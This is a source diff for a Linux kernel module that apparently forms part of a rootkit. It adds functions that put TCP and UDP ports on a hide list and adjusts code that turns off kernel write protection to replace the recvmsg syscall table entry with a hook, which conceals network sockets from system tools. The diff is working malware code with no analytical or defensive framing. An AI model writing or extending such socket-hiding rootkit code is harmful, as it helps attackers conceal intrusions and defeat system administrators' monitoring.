@@ -15,10 +15,14 @@
 #include<linux/slab.h>
 
 #include "hooking.h"
+#include "socket_hiding.h"
 
 #define MAX_PORTC 255
 #define in_tcplist(x) port_in_list(x, tcp_ports, tcp_portc)
 #define in_udplist(x) port_in_list(x, udp_ports, udp_portc)
+#define hide_port_m(port, nme) if(nme##_portc < MAX_PORTC){\
+	nme##_ports[nme##_portc] = port;\
+	nme##_portc++; }
 
 static unsigned int tcp_ports[MAX_PORTC];
 static unsigned int udp_ports[MAX_PORTC];
@@ -170,7 +174,13 @@ struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* na
   	return result;
 }
 
+void hide_port_tcp(int port){
+	hide_port_m(port, tcp);
+}
 
+void hide_port_udp(int port){
+	hide_port_m(port, udp);
+}	
 
 void hide_sockets(void){
 	struct proc_dir_entry * net_dent, * tcp_dent, * udp_dent;
@@ -199,8 +209,8 @@ void hide_sockets(void){
 		}
 
 		disable_wp();
-		orig_sys_recvmsg = syscall_table[__NR_recvmsg];
-		syscall_table[__NR_recvmsg] = my_sys_recvmsg;
+		orig_sys_recvmsg = syscall_table()[__NR_recvmsg];
+		syscall_table()[__NR_recvmsg] = my_sys_recvmsg;
 		enable_wp();
 		is_hidden = 1;
 	}
@@ -212,7 +222,7 @@ void unhide_sockets(void){
 	*tcp_hook_ptr = orig_tcp_seq_show;
 	if(is_hidden == 1){
 		disable_wp();
-		syscall_table[__NR_recvmsg] = orig_sys_recvmsg;
+		syscall_table()[__NR_recvmsg] = orig_sys_recvmsg;
 		enable_wp();
 		is_hidden = 0;
 	}
